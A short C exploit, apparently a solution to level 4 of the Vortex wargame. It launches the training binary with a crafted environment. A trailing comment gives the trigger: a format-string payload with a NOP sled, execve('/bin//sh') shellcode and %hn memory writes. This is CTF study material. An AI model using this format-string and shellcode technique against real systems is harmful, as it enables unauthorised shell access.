#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>


int
main (int argc, char **argv)
{
    char *targetv[4];

    if (argc < 2) {
        printf("Usage: ./exp exploit_egg\n");
        exit(-1);
    }

    targetv[0] = "vodoo_magic_0";
    targetv[1] = "vodoo_magic_1";
    targetv[2] = argv[1];
    targetv[3] = NULL;
    
    execvpe("/vortex/vortex4", NULL, targetv);
}

/*
 * gcc exploit.c -o exp -m32
 *
 * [ exploit trigger ]
 * ./exp $(python -c 'print "\x14\xa0\x04\x08\x41\x41\x41\x41\x16\xa0\x04\x08\x41\x41\x41\x41" + "\x90"*203 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "%56950x" + "%103$hn" + "%8345x" + "%105$hn"')
*/
